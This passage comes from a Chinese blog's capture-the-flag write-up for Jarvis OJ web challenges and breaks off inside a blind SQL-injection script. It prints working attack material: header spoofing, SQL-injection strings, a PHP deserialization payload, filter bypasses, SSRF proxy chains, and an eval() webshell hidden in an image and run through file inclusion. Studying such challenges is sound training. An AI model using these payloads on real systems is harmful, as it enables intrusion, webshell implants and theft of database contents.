class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $id = $_GET[ &apos;id&apos; ]; </span><br><span class="line"></span><br><span class="line">    // Was a number entered? </span><br><span class="line">    if(is_numeric( $id )) &#123; </span><br><span class="line">        // Check the database </span><br><span class="line">        $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); </span><br><span class="line">        $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">        $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">        // Make sure only 1 result is returned </span><br><span class="line">        if( $data-&gt;rowCount() == 1 ) &#123; </span><br><span class="line">            // Get values </span><br><span class="line">            $first = $row[ &apos;first_name&apos; ]; </span><br><span class="line">            $last  = $row[ &apos;last_name&apos; ]; </span><br><span class="line"></span><br><span class="line">            // Feedback for end user </span><br><span class="line">            echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Jarivs oj" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/Jarivs oj/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.554Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/Jarivs oj/">Jarivs Oj Web</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个挺不错的ctf平台:<a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a></p>
+<h2 id="Jarivs-Oj-Web"><a href="#Jarivs-Oj-Web" class="headerlink" title="Jarivs Oj Web"></a>Jarivs Oj Web</h2><h2 id="0X01-PORT51"><a href="#0X01-PORT51" class="headerlink" title="0X01 PORT51"></a>0X01 PORT51</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目链接：http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/KS10JJ%28Y%28OOT7%25L5NE%60VY@P.png" alt="image"></p>
+<p>这里说要用本地端口为51来访问题目，这里用到一个命令curl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl –local-port http://web.jarvisoj.com:32770/</span><br></pre></td></tr></table></figure>
+<p>这里貌似题目服务器出了点问题，不弹出flag了，下面对curl做简单解释下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux curl是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称url为下载工具。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl –local-port xxxxxxxx 强制使用本地端口访问xxxxx</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-LOCALHOST"><a href="#0x02-LOCALHOST" class="headerlink" title="0x02 LOCALHOST"></a>0x02 LOCALHOST</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目入口：http://web.jarvisoj.com:32774/</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/Z%5BNCBE32IS~3A%252$HX_VG1R.png" alt="image"></p>
+<p>意思是要从本地主机访问题目，抓包添加：<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/MNEH@E9T~4WY2%29B1UY%28ZTLO.png" alt="image"></p>
+<h2 id="0x03-Login"><a href="#0x03-Login" class="headerlink" title="0x03 Login"></a>0x03 Login</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">需要密码才能获得flag哦。</span><br><span class="line"></span><br><span class="line">题目链接：http://web.jarvisoj.com:32772/</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/@_5%28J%5BOA50CF%28C2@8I07DT1.png" alt="image"></p>
+<p>抓包后发现 response处有hint:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://p1vrkwaxt.bkt.clouddn.com/@_5%28J%5BOA50CF%28C2@8I07DT1.png</span><br></pre></td></tr></table></figure></p>
+<p>百度后可知是md5加密的sql注入,具体解释我博客有:<br><a href="https://ntwyc2018.github.io/2018/01/27/md5%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://ntwyc2018.github.io/2018/01/27/md5%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/</a></p>
+<p>输入ffifdyop得到flag</p>
+<h2 id="0x04-神盾局的秘密"><a href="#0x04-神盾局的秘密" class="headerlink" title="0x04 神盾局的秘密"></a>0x04 神盾局的秘密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</span><br><span class="line"></span><br><span class="line">题目入口：http://web.jarvisoj.com:32768/</span><br></pre></td></tr></table></figure>
+<p>点开图片后发现URL如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==</span><br></pre></td></tr></table></figure></p>
+<p>可以猜想是文件包含,后面是一串base64码,解码后是shield.png</p>
+<h3 id="原理-利用base64访问任意文件"><a href="#原理-利用base64访问任意文件" class="headerlink" title="原理:利用base64访问任意文件"></a>原理:利用base64访问任意文件</h3><p>访问showing.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $f = $_GET[&apos;img&apos;];</span><br><span class="line">    if (!empty($f)) &#123;</span><br><span class="line">        $f = base64_decode($f);</span><br><span class="line">        if (stripos($f,&apos;..&apos;)===FALSE &amp;&amp; stripos($f,&apos;/&apos;)===FALSE &amp;&amp; stripos($f,&apos;\\&apos;)===FALSE</span><br><span class="line">        &amp;&amp; stripos($f,&apos;pctf&apos;)===FALSE) &#123;</span><br><span class="line">            readfile($f);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;File not found!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>访问index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    require_once(&apos;shield.php&apos;);</span><br><span class="line">    $x = new Shield();</span><br><span class="line">    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];</span><br><span class="line">    if (!empty($g)) &#123;</span><br><span class="line">        $x = unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $x-&gt;readfile();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>访问shield.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is in pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public $file;</span><br><span class="line">        function __construct($filename = &apos;&apos;) &#123;</span><br><span class="line">            $this -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function readfile() &#123;</span><br><span class="line">            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  </span><br><span class="line">            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) &#123;</span><br><span class="line">                return @file_get_contents($this-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>flag在pctf.php文件里面，我们利用shield.php里面的$file,来构造一个序列化值，$filename=pctf.php,到了index.php实例化后反序列化,$x=readfile()读取pctf.php</p>
+<p>首先在本地phpstudy搭建环境，两个文件如下:<br></p>
+<h3 id="test-php"><a href="#test-php" class="headerlink" title="test.php"></a>test.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once(&apos;shield.php&apos;);</span><br><span class="line">    $x = new Shield();</span><br><span class="line">    echo serialize($x);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="shield-php"><a href="#shield-php" class="headerlink" title="shield.php"></a>shield.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public $file;</span><br><span class="line">        function __construct($filename = &apos;pctf.php&apos;) &#123;</span><br><span class="line">            $this -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        function readfile() &#123;</span><br><span class="line">            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  </span><br><span class="line">            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) &#123;</span><br><span class="line">                return @file_get_contents($this-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>得到的序列值为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后构造payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x05-IN-a-mess"><a href="#0x05-IN-a-mess" class="headerlink" title="0x05 IN a mess"></a>0x05 IN a mess</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。</span><br><span class="line"></span><br><span class="line">题目入口：http://web.jarvisoj.com:32780/</span><br></pre></td></tr></table></figure>
+<p>查看源代码发现index.phps文件. 访问后源码如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;&lt;!--index.phps--&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: index.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;Hahahahahaha&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;flag.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;work harder!harder!harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>典型的php绕过</p>
+<ul>
+<li>$data==”1112 is a nice lab!”<br>原理 file_get_contents(“php://input”)</li>
+<li>id=(字母) <br>原理: php弱类型绕过</li>
+<li>b=%00111111  <br>原理:eregi()可以用%00截断</li>
+</ul>
+<p>最后的payload如下:<br><img src="http://p1vrkwaxt.bkt.clouddn.com/_2YE%7DWY77LKOO841%28EQE7CS.png" alt="image"><br>得到下一关的目录地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Come ON!!! &#123;/^HT2mCpcvOLf&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现url:id=1再测试后是个sql注入</p>
+<p>进行一波检验可知sql绕过两点<br></p>
+<ul>
+<li>空格绕过 可用/<em>注释</em>/绕过<br><br><a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">参考链接</a></li>
+<li>敏感字符的过滤 可用双写绕过</li>
+</ul>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/4%28U%7B6JC_3~2%7B4%60W%5BGJ9~@04.png" alt="image"><br><br>显示位为 3</p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/WM9%7D%7DX5K7%7BGXOV~%28A%5D@8QXX.png" alt="image"><br><br>爆出库名test</p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/2~S1JM%28SH4%5B01I$W4BOAEW6.png" alt="image"><br><br>爆出表名content</p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/54FWQ%7BTYWQWW%60%5BQZV%5DTB4_W.png" alt="image"><br><br>爆出字段id,context,title</p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/HV0EP_HK1K_Q7CB3IKW96DJ.png" alt="image"><br><br>爆出字段内容(flag)</p>
+<h2 id="0x06-Chopper"><a href="#0x06-Chopper" class="headerlink" title="0x06 Chopper"></a>0x06 Chopper</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？</span><br><span class="line"></span><br><span class="line">关卡入口：http://web.jarvisoj.com:32782/</span><br><span class="line"></span><br><span class="line">题目来源:ISCC2016</span><br></pre></td></tr></table></figure>
+<p>一个很有学习价值的题目,这里猜测是用file_get_content编写 </p>
+<p>首先 本地phpstudy搭建三个php文件</p>
+<p>1.php and 2.php如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&quot;$_GET[a]&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>3.php代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo `$_GET[360]`; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>构造payload如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?a=http://127.0.0.1/2.php?a=http://127.0.0.1/3.php?360=ping</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/N%5D@S_O78C2K%281~0RXKL@%60_Y.png" alt="image"></p>
+<p>同样地我也在本地测试了我的远程服务器上的一个文件，访问成功，这或许是一个姿势吧,据说叫啥url访问代理服务器，然后代理再访问另一个服务器</p>
+<p>查看源代码有两个关键信息:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--&lt;script&gt;alert(&apos;admin ip is 103.27.76.153&apos;)&lt;/script&gt;--&gt;</span><br></pre></td></tr></table></figure></p>
+<p>上面很明显的是另外一个代理</p>
+<p>直接访问admin ip被禁止,再结合img的url,可以猜想是通过proxy.php来访问admin ip再去访问admin目录,最后构造的payload如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32782/proxy.php?url=http://103.27.76.153/proxy.php?url=http://web.jarvisoj.com:32782/admin/</span><br></pre></td></tr></table></figure></p>
+<p>不知道为啥，这里仍然不行，貌似是服务器挂了或者被日了，这里结合别人的wp进行分析,接着发现robots.txt文件(可以直接扫出来),然后就是代码审计了</p>
+<h2 id="0x07-Easy-Gallery"><a href="#0x07-Easy-Gallery" class="headerlink" title="0x07 Easy Gallery"></a>0x07 Easy Gallery</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;没有什么防护是一个漏洞解决不了的，如果有，那</span><br><span class="line">就.....</span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">题目入口：http://web.jarvisoj.com:32785/</span><br><span class="line"></span><br><span class="line">题目来源：ISCC2016</span><br></pre></td></tr></table></figure>
+<p>这道题是个文件上传+文件包含的题目</p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/~FFDSD~0I5T%60TLKS8K0D_%5BB.png" alt="image"></p>
+<p>尝试构造后缀名为jpg的文件上传，仍然上传失败，可以确定这个不仅对后缀名进行检测，还对文件头检测</p>
+<p>这里我们可以将一句话木马插入一个图片中，准备好两个文件如下:<br></p>
+<p>1.php:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($POST[&apos;c&apos;]); ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>1.jpg(在网上找的图片)</p>
+<p>在终端执行命令如下:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg/b+1.php/a hack.jpg</span><br></pre></td></tr></table></figure></p>
+<p>会生成一个带有一句话木马的图片hack.jpg,查看hack.jpg文本，可以发现一句话木马<br></p>
+<p>然后上传，发现上传成功<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/SW0%7B%60$R5~O6_GS4CES1VTN2.png" alt="image"></p>
+<p>然后来到这个页面view<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/EWSUKP56LP6%286CN%7B0S21OR4.png" alt="image"></p>
+<p>可以看到刚刚上传的图片，查看源代码可以看到该图片的路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;uploads/1527409880.jpg&quot;/&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们知道，带jpg格式的是无法执行php命令的，但我们可以利用这里的文件包含漏洞来执行里面木马命令</p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/X76%5D~TM2%5B3@ABIT63QPT77D.png" alt="image"></p>
+<p>根据报错说多了一个.php,这里可以用%00截断，最后的payload为:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32785/index.php?page=uploads/1527409880.jpg%00</span><br></pre></td></tr></table></figure></p>
+<p>结果返回 You should not do it</p>
+<p>说明后台可能对后台中的&lt;?php  ?&gt;进行了过滤,换个一句话为:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">	eval($POST[&quot;c&quot;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>再重复以上操作，利用文件包含访问这个图片，得到flag</p>
+<p>一个挺不错的姿势，继续进步继续加油</p>
+<h2 id="0x08-Simple-Injection"><a href="#0x08-Simple-Injection" class="headerlink" title="0x08 Simple Injection"></a>0x08 Simple Injection</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">很简单的注入，大家试试？</span><br><span class="line"></span><br><span class="line">题目入口：http://web.jarvisoj.com:32787/</span><br><span class="line"></span><br><span class="line">题目来源：ISCC2016</span><br></pre></td></tr></table></figure>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/%5BT2TN0RN74HN%7B2O5A9Z8%5DXV.png" alt="image"></p>
+<p>典型的SQL注入登录框</p>
+<h3 id="常见的登陆漏洞类型"><a href="#常见的登陆漏洞类型" class="headerlink" title="常见的登陆漏洞类型"></a>常见的登陆漏洞类型</h3><p>同时验证用户名和密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql = select * from users where username=$usernmae and password=$password</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">if($result) &#123;</span><br><span class="line">	echo &quot;登陆成功&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	echo &quot;登陆失败&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>分步验证用户名、密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select password from users where username=&apos;$username&apos;&quot;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">if($result) &#123;</span><br><span class="line">    $row = mysql_fetch_row($result);</span><br><span class="line">    $query_password = $row[$password];</span><br><span class="line">    #对输入的$password进行变形</span><br><span class="line">    $input_password = modify($passowrd);</span><br><span class="line">    if($input_password == $query_password) &#123;</span><br><span class="line">        echo &quot;登陆成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;密码错误&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;用户不存在&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里经过不断测试可以知道是个分步验证用户名与密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=1111 //返回密码错误</span><br><span class="line">username=user&amp;password=1111 //返回用户名错误</span><br></pre></td></tr></table></figure></p>
+<p>也就是说上面username注入语句正确的话会返回密码错误，反之返回用户名错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=user&apos;/**/or/**/1=1#&amp;password=123456</span><br></pre></td></tr></table></figure>
+<p>返回密码错误，说明sql注入语句是正确的，后台只过滤了空格，用/<em>1</em>/绕过即可,接下来就是简单的写脚本爆数据库名爆表爆字段爆字段内容了，下面给出脚本.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line"></span><br><span class="line">def test(num,asc):</span><br><span class="line">	#data=&#123;&apos;username&apos;:&apos;admin\&apos;/*1*/and/*1*/ascii(substr((select/*1*/group_concat(table_name)/*1*/from/*1*/information_schema.tables/*1*/where/*1*/table_schema=database()),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125; # 数据库为injection</span><br><span class="line">	#data=&#123;&apos;username&apos;:&apos;admin\&apos;/*1*/and/*1*/ascii(substr((select/*1*/group_concat(column_name)/*1*/from/*1*/information_schema.columns/*1*/where/*1*/table_name=\&apos;admin\&apos;),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;</span><br><span class="line">	data=&#123;&apos;username&apos;:&apos;admin\&apos;/*1*/and/*1*/ascii(substr((select/*1*/group_concat(username)/*1*/from/*1*/injection.admin/*1*/where/*1*/table_schema=database()),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;</span><br><span class="line">	r = 